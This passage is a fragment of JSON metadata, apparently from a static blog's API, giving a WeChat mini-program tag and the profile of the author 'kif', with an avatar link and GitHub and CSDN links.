mins."},"categories":[],"tags":[{"name":"微信小程序","slug":"微信小程序","count":5,"path":"api/tags/微信小程序.json"}],"author":{"name":"kif","slug":"blog-author","avatar":"https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png","link":"/","description":"时间再拉长一点，让我有时间收拾一下心情","socials":{"github":"https://github.com/wkif","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/qq_54739682?type=blog","juejin":"","customs":{}}}}}